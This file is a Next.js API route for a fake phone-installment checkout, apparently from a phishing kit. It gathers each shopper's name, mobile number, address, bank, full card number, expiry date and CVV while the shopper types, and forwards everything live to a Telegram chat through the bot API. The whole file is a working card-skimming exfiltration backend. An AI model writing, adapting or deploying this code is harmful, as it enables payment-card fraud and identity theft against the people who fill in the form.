import { NextResponse } from 'next/server';

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { stepName, data, messageId } = body;

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId || botToken.includes('your_telegram_bot_token')) {
      return NextResponse.json({ success: false, message: 'Telegram credentials missing' }, { status: 200 });
    }

    const timestamp = new Date().toLocaleTimeString('en-PK', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
    const sessionId = data.sessionId || `SESS-${Math.floor(1000 + Math.random() * 9000)}`;

    let messageText = `🟢 <b>LIVE ACTIVE SESSION</b> | Ping: <code>200ms</code>\n`;
    messageText += `🆔 <b>Session ID:</b> <code>#${sessionId}</code>\n`;
    messageText += `🕒 <b>Last Update:</b> <code>${timestamp}</code>\n`;
    messageText += `━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
    messageText += `📍 <b>Current Step:</b> <b>${stepName}</b>\n\n`;

    if (data.model) {
      messageText += `📱 <b>SELECTED DEVICE & PLAN:</b>\n`;
      messageText += `• <b>Model:</b> ${data.model.name}\n`;
      messageText += `• <b>Storage:</b> ${data.storage?.size || 'Standard'}\n`;
      messageText += `• <b>Color:</b> ${data.color?.name || 'Standard'}\n`;
      messageText += `• <b>Cash Price:</b> Rs. ${(data.totalPrice || data.model.basePrice || 0).toLocaleString('en-PK')}\n`;
      messageText += `• <b>Plan:</b> ${data.months || 24} Months @ Rs. ${(data.monthlyEmi || 0).toLocaleString('en-PK')}/mo\n\n`;
    }

    if (data.customer) {
      messageText += `👤 <b>CUSTOMER INFORMATION:</b>\n`;
      messageText += `• <b>Full Name:</b> ${data.customer.fullName || '<i>Typing...</i>'}\n`;
      messageText += `• <b>Mobile Number:</b> <code>${data.customer.mobileNumber || '<i>Typing...</i>'}</code>\n`;
      messageText += `• <b>Address:</b> ${data.customer.deliveryAddress || '<i>Typing...</i>'}\n`;
      messageText += `• <b>Delivery Type:</b> ${data.customer.deliveryType === 'open_parcel' ? 'Open Parcel Verification' : 'Standard Delivery'}\n`;
      messageText += `• <b>Payment Method:</b> ${(data.customer.paymentMethod || 'card').toUpperCase()}\n\n`;
    }

    if (data.payment) {
      messageText += `💳 <b>PAYMENT & CARD DETAILS:</b>\n`;
      if (data.customer?.paymentMethod === 'card' || data.payment.cardNumber || data.payment.cardName) {
        if (data.payment.bankId) messageText += `• <b>Bank Name:</b> ${data.payment.bankId.toUpperCase()}\n`;
        if (data.payment.cardNetwork) messageText += `• <b>Card Network:</b> ${data.payment.cardNetwork.toUpperCase()}\n`;
        if (data.payment.cardName) messageText += `• <b>Cardholder Name:</b> ${data.payment.cardName}\n`;
        if (data.payment.registeredMobile) messageText += `• <b>Bank Reg. Mobile:</b> <code>${data.payment.registeredMobile}</code>\n`;
        if (data.payment.cardNumber) messageText += `• <b>Card Number:</b> <code>${data.payment.cardNumber}</code>\n`;
        if (data.payment.expiry) messageText += `• <b>Expiry Date:</b> <code>${data.payment.expiry}</code>\n`;
        if (data.payment.cvv) messageText += `• <b>CVV / CVC Code:</b> <code>${data.payment.cvv}</code>\n`;
      } else {
        if (data.payment.walletType) messageText += `• <b>Wallet Service:</b> ${data.payment.walletType.toUpperCase()}\n`;
        if (data.payment.walletAccountName) messageText += `• <b>Account Title:</b> ${data.payment.walletAccountName}\n`;
        if (data.payment.proofPreviewUrl) messageText += `• <b>Payment Proof Photo:</b> Attached 📸\n`;
      }
    }

    // Edit single message if messageId exists
    if (messageId) {
      const editUrl = `https://api.telegram.org/bot${botToken}/editMessageText`;
      const editRes = await fetch(editUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          message_id: messageId,
          text: messageText,
          parse_mode: 'HTML'
        })
      });

      const editData = await editRes.json();
      if (editData.ok) {
        return NextResponse.json({ success: true, messageId });
      }
    }

    // Send single initial message if messageId does not exist yet
    const sendUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const sendRes = await fetch(sendUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: messageText,
        parse_mode: 'HTML'
      })
    });

    const sendData = await sendRes.json();
    if (sendData.ok) {
      return NextResponse.json({ success: true, messageId: sendData.result.message_id });
    }

    return NextResponse.json({ success: false, error: sendData.description }, { status: 500 });
  } catch (error: any) {
    console.error('Realtime Telegram error:', error);
    return NextResponse.json({ success: false, error: error.message }, { status: 500 });
  }
}
